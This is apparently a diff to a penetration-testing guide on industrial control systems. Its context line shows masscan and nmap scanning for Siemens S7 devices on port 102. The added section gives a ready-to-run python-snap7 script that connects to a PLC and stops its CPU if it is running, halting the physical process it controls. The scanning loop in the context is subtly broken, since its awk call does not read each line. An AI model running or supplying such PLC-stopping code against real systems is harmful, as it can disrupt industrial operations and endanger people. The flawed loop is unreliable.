@@ -39,6 +39,20 @@ For scalable scanning and reconnaissance, utilize masscan for faster enumeration
 masscan <IP Range> -p 102 -oL Possible_ICS.txt; cat Possible_ICS.txt | while read LINE; do nmap --script s7-info.nse -p 102 $(awk '{print $4}'); done
 ```
 
+## Stopping S7 CPUs with Python:
+
+```
+import snap7
+
+client = snap7.client.Client()
+client.connect("<PLC IP>", 0, 0)
+
+cpu_state = client.get_cpu_state()
+
+if cpu_state == "S7CpuStatusRun":
+    client.plc_stop()
+```
+
 ## Modbus Scanning
 
 ```
